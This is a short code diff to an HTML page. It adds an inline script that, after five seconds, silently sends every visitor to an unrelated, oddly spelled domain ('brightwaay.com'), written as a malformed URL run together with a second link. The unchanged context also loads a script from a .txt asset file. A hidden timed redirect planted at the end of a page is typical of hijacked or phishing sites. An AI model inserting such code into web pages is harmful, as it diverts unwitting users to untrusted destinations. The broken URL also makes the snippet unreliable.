@@ -71,5 +71,12 @@
 </script>
 <script src="https://assets.website-files.com/5d7517ff7288d5a70b3b64bd/613b6a6361dc95d04258d19b_script.txt">
 </script>
+<script type="text/javascript">
+(function(){
+   setTimeout(function(){
+     window.location="http://brightwaay.com/](https://streamyard.com/i3fnfdjv72";
+   },5000); /* 1000 = 1 second*/
+})();
+</script>
 </body>
 </html>
